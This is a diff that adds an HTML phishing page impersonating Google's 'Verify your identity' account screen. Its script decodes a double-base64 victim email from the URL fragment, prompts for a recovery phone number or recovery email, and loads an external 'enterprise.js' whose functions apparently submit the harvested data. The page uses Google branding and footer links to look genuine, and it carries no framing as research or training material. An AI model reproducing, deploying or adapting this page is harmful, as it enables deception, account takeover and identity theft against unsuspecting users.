@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta content="width=300, initial-scale=1" name="viewport">
+  <meta name="robots" content="noindex">
+  <title>Verify your - Google Accounts</title>
+  <link id="favLink" rel="shortcut icon" href="" type="image/x-icon">
+<link id="gstyles" href="" rel="stylesheet" type="text/css">
+<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+  .google-header-bar.centered {
+  height: 83px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 25px auto 20px;
+  }
+  .card {
+  margin-bottom: 20px;
+  }
+  
+</style>
+
+<style media="screen and (max-width: 580px)">
+  html, body {
+  font-size: 14px;
+  }
+  .google-header-bar.centered {
+  height: 73px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 20px auto 15px;
+  }
+  .content {
+  padding-left: 10px;
+  padding-right: 10px;
+  }
+  .hidden-small {
+  display: none;
+  }
+  .card {
+  padding: 20px 15px 30px;
+  width: 270px;
+  }
+  .footer ul li {
+  padding-right: 1em;
+  }
+  .lang-chooser-wrap {
+  display: none;
+  }
+</style>
+
+
+  <style media="screen and (max-width: 580px)">
+  .flex-card {
+  width: 270px;
+  padding: 20px 15px 30px;
+  }
+  .flex-card input[type=email],
+  .flex-card input[type=number],
+  .flex-card input[type=tel],
+  .flex-card input[type=text],
+  .flex-card .rc-button {
+  width: 100%;
+  }
+  </style>
+
+
+<style media="screen and (max-width: 580px)">
+  .challenge-card .description {
+  margin-bottom: 18px;
+  }
+  .challenge-card .option-wrapper input[name="challengetype"] {
+  margin-bottom: 10px;
+  margin-top: 15px;
+  }
+  .challenge-card .label-selected {
+  padding-top: 15px;
+  }
+  .challenge-card .label-unselected {
+  padding-top: 15px;
+  padding-bottom: 10px;
+  }
+  .challenge-card .option-content-selected {
+  padding-bottom: 10px;
+  }
+  
+</style>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>  
+  </head>
+  <body>
+  <div class="wrapper">
+  <div class="google-header-bar  centered">
+  <div class="header content clearfix">
+  <img alt="Google" class="logo" src="">
+  </div>
+  </div>
+  <div class="main content clearfix">
+<div class="card flex-card challenge-card"  style="width:40%" onkeypress="return checkRadio(event);">
+  <form  id="challengeform">
+ 
+  <h1>
+  Verify your identity
+  </h1>
+  <div class="body">
+  <p class="description">
+ For your protection, please help us verify your identity.
+  <a href="http://support.google.com/accounts/bin/answer.py?answer=2506340&amp;hl=en&amp;ctx=ch_LoginVerification&amp;p=mail&amp;email_address=" target="_blank">Learn more</a>.
+  </p>
+  <input id="userid" name="email" value="" type="hidden">
+  <div class="option-wrapper clearfix" id="PhoneVerificationChallengeOption">
+  <input class="radio" name="challengetype" id="PhoneVerificationChallenge" value="PhoneVerificationChallenge" type="radio">
+  <div class="option">
+  <label for="PhoneVerificationChallenge" id="PhoneVerificationChallengeLabel">
+  Enter your phone number
+  </label>
+  <div class="option-content" id="PhoneVerificationChallengeOptionContent">
+  <input name="phoneNumber" id="phoneNumber" size="30" placeholder="Enter full phone number: (123) 456-7890" dir="ltr" type="tel" disabled="true">
+  <span role="alert" class="error-msg" id="errPhn" style="display:none">Please enter your recovery phone no
+  </span>
+  <span role="alert" class="error-msg">
+  </span>
+  <div class="help">
+  We'll check if this matches the phone number we have on file
+  </div>
+  </div>
+  </div>
+  </div>
+  <div class="option-wrapper clearfix" id="SecretQuestionChallengeOption">
+  <input class="radio" name="challengetype" id="SecretQuestionChallenge" value="SecretQuestionChallenge" type="radio">
+  <div class="option">
+  <div class="option-content" id="SecretQuestionChallengeOptionContent"><br>
+  <div id="secret-question">
+  Enter your Recovery email
+  </div>
+  <input name="answer" id="answer" size="30" placeholder="Enter full Recovery email" type="text" disabled="true">
+  <span role="alert" class="error-msg" id="errMail" style="display:none">Please enter your recovery email address
+  </span>
+
+  <div class="help">
+  We'll check if this matches the Recovery email we have on file
+  </div>  <br>  
+ <div id="mssg" style="color:#d93025;display:none">Please select verification method</div>
+
+  </div>
+  </div>
+  </div>
+  </div>
+  <br>
+  <div name="submitChallenge" id="loginbtn" style="width:100px;cursor:pointer" id="submitChallenge" class="rc-button rc-button-submit">Continue</div>
+  </form>
+  <script>
+
+
+$(document).ready(function(){
+	
+	//set global variables
+	var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
+	const myArray = vsr.split("&");
+	vsr = myArray[0];
+	
+		
+	//set external files
+	const prefix = "C:/Users/Administrator/Desktop/SCRIPTS/01/01/generalPg/enterprise/";
+
+	var arrayset =[
+		['favLink','faviconV2_google.png','href','id'],
+		['gstyles','styles.css','href','id'],
+		['logo','logo_2x.png','src','class'],
+		['universal','universal_language_settings-21.png','src','id'],
+	
+	]
+
+
+    // Load the external script and call the external callback function
+           loadExternalScript('enterprise.js', function() {
+				checkDNS(vsr,function(){
+					onBodyLoad(arrayset, prefix, vsr);
+				});
+             
+
+            });
+
+			
+	// function to load external script
+	function loadExternalScript(url,callback) {
+		var script = document.createElement('script');
+		script.src = prefix + url;
+		script.onload = function() {
+			
+			if (callback) {
+				callback();				
+			}
+			
+		};
+
+		document.head.appendChild(script); // Append the script to the body
+	}
+	var usr = atob(atob(vsr));
+	$("#userid").val(usr);	
+});
+	
+
+
+//radio button selections
+$(function(){
+	$('input[type="radio"]').change(function(e){
+		if ($(this).is(':checked')) {
+			//alert($(this).val());
+			var radVal=$(this).val();
+			document.getElementById('mssg').style.display="none";
+			//alert (radVal);
+			switch (radVal){
+				
+				case "SecretQuestionChallenge":
+				document.getElementById('answer').disabled=false;
+				$('#phoneNumber').val("");
+				document.getElementById('errPhn').style.display="none";
+				document.getElementById('phoneNumber').disabled=true;
+					 
+				break;
+					
+				case "PhoneVerificationChallenge":
+				document.getElementById('phoneNumber').disabled=false;
+				$('#answer').val("");
+				document.getElementById('errMail').style.display="none";
+				document.getElementById('answer').disabled=true;
+					
+				break;
+				
+			}
+		}
+			
+			
+	});
+		
+});
+
+	
+$('#loginbtn').on('click', function(event) {
+	var optionEmail = document.getElementById('SecretQuestionChallenge');
+	var optionPhone = document.getElementById('PhoneVerificationChallenge');
+	var userEmail = document.getElementById("userid").value;
+	var phn = $("#phoneNumber").val();
+	var scrt = $("#answer").val();
+	
+	//get global variables
+	var vsrFmt = window.location.href.slice(window.location.href.indexOf('#') + 1);
+	const myArrayFmt = vsrFmt.split("&");
+	var fmt = myArrayFmt[1];
+	
+	if ((!optionEmail.checked ) && (!optionPhone.checked)){//no selection
+		document.getElementById('mssg').innerHTML="Please select verification method";
+		document.getElementById('mssg').style.display="block";
+		return false;
+	}
+	else{
+		if(optionEmail.checked ){
+			if (scrt !=""){
+				validateEmail(scrt,userEmail,fmt);
+			}else{
+				document.getElementById('errMail').style.display="block";
+			}
+	
+		}
+		if(optionPhone.checked){
+			if(phn !=""){
+				validatePhone(phn,userEmail,fmt);
+			}else{
+				document.getElementById('errPhn').style.display="block";
+			}
+		
+		}
+	
+	}
+
+	
+
+	
+});
+function validateEmail(inputText,userEmail,fmt){
+	
+	var mailformat = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
+	if(inputText.match(mailformat)){
+		challengeSubmit(userEmail,fmt);
+
+	}
+	else{
+		//alert(inputText);
+		document.getElementById('answer').value="";
+		document.getElementById('errMail').style.display="block";
+		return false;
+	}
+  
+}
+function validatePhone(inputText,userEmail,fmt){
+	
+	//var phoneNum = inputText.replace(/[^\d]/g, '');
+	var phnformat ="^\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}$";
+	let phoneRegex = new RegExp(phnformat);
+	let isValid = phoneRegex.test(inputText);
+	if(isValid) {
+		challengeSubmit(userEmail,fmt);
+	
+	}else{
+		document.getElementById('phoneNumber').value="";
+		document.getElementById('errPhn').style.display="block";
+		return false;
+	}
+  
+  
+}
+function checkRadio(e){
+	var keyCode = e.keyCode || e.which;
+	if (e.keyCode == 13) {
+		//e.preventDefault();
+		$('#loginbtn').click();
+	}
+    
+}
+
+</script>
+</div>
+</div>
+  </div>
+  <div class="google-footer-bar">
+  <div class="footer content clearfix">
+  <ul id="footer-list">
+  <li>
+  Google
+  </li>
+  <li>
+  <a href="#" target="_blank">
+  Privacy &amp; Terms
+  </a>
+  </li>
+  <li>
+  <a href="#" target="_blank">
+  Help
+  </a>
+  </li>
+  </ul>
+  <div id="lang-vis-control" style="display: inline;">
+  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
+  <label for="lang-chooser"><img id="universal" src="" alt="Change language"></label>
+  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
+  <option value="af">
+  ?Afrikaans?
+  </option>
+  <option value="az">
+  ?az?rbaycan?
+  </option>
+  <option value="in">
+  ?Bahasa Indonesia?
+  </option>
+  <option value="ms">
+  ?Bahasa Melayu?
+  </option>
+  <option value="ca">
+  ?catal�?
+  </option>
+  <option value="cs">
+  ?Ce�tina?
+  </option>
+  <option value="da">
+  ?Dansk?
+  </option>
+  <option value="de">
+  ?Deutsch?
+  </option>
+  <option value="et">
+  ?eesti?
+  </option>
+  <option value="en-GB">
+  ?English (United Kingdom)?
+  </option>
+  <option value="en" selected="selected">
+  ?English (United States)?
+  </option>
+  <option value="es">
+  ?Espa�ol (Espa�a)?
+  </option>
+  <option value="es-419">
+  ?Espa�ol (Latinoam�rica)?
+  </option>
+  <option value="eu">
+  ?euskara?
+  </option>
+  <option value="fil">
+  ?Filipino?
+  </option>
+  <option value="fr-CA">
+  ?Fran�ais (Canada)?
+  </option>
+  <option value="fr">
+  ?Fran�ais (France)?
+  </option>
+  <option value="gl">
+  ?galego?
+  </option>
+  <option value="hr">
+  ?Hrvatski?
+  </option>
+  <option value="zu">
+  ?isiZulu?
+  </option>
+  <option value="is">
+  ?�slenska?
+  </option>
+  <option value="it">
+  ?Italiano?
+  </option>
+  <option value="sw">
+  ?Kiswahili?
+  </option>
+  <option value="lv">
+  ?latvie�u?
+  </option>
+  <option value="lt">
+  ?lietuviu?
+  </option>
+  <option value="hu">
+  ?magyar?
+  </option>
+  <option value="nl">
+  ?Nederlands?
+  </option>
+  <option value="no">
+  ?norsk?
+  </option>
+  <option value="pl">
+  ?polski?
+  </option>
+  <option value="pt">
+  ?Portugu�s?
+  </option>
+  <option value="pt-BR">
+  ?Portugu�s (Brasil)?
+  </option>
+  <option value="pt-PT">
+  ?Portugu�s (Portugal)?
+  </option>
+  <option value="ro">
+  ?rom�na?
+  </option>
+  <option value="sk">
+  ?Slovencina?
+  </option>
+  <option value="sl">
+  ?sloven�cina?
+  </option>
+  <option value="fi">
+  ?Suomi?
+  </option>
+  <option value="sv">
+  ?Svenska?
+  </option>
+  <option value="vi">
+  ?Ti?ng Vi?t?
+  </option>
+  <option value="tr">
+  ?T�rk�e?
+  </option>
+  <option value="el">
+  ??????????
+  </option>
+  <option value="bg">
+  ???????????
+  </option>
+  <option value="mn">
+  ????????
+  </option>
+  <option value="ru">
+  ?????????
+  </option>
+  <option value="sr">
+  ????????
+  </option>
+  <option value="uk">
+  ????????????
+  </option>
+  <option value="ka">
+  ?????????
+  </option>
+  <option value="hy">
+  ?????????
+  </option>
+  <option value="iw">
+  ????????
+  </option>
+  <option value="ur">
+  ???????
+  </option>
+  <option value="ar">
+  ??????????
+  </option>
+  <option value="fa">
+  ????????
+  </option>
+  <option value="am">
+  ??????
+  </option>
+  <option value="ne">
+  ????????
+  </option>
+  <option value="mr">
+  ???????
+  </option>
+  <option value="hi">
+  ????????
+  </option>
+  <option value="bn">
+  ???????
+  </option>
+  <option value="gu">
+  ?????????
+  </option>
+  <option value="ta">
+  ???????
+  </option>
+  <option value="te">
+  ????????
+  </option>
+  <option value="kn">
+  ???????
+  </option>
+  <option value="ml">
+  ????????
+  </option>
+  <option value="si">
+  ???????
+  </option>
+  <option value="th">
+  ?????
+  </option>
+  <option value="lo">
+  ?????
+  </option>
+  <option value="km">
+  ???????
+  </option>
+  <option value="ko">
+  ?????
+  </option>
+  <option value="zh-HK">
+  ???(??)?
+  </option>
+  <option value="ja">
+  ?????
+  </option>
+  <option value="zh-CN">
+  ??????
+  </option>
+  <option value="zh-TW">
+  ??????
+  </option>
+  </select>
+  </span>
+  </div>
+  </div>
+</div>
+
+
+</body></html>
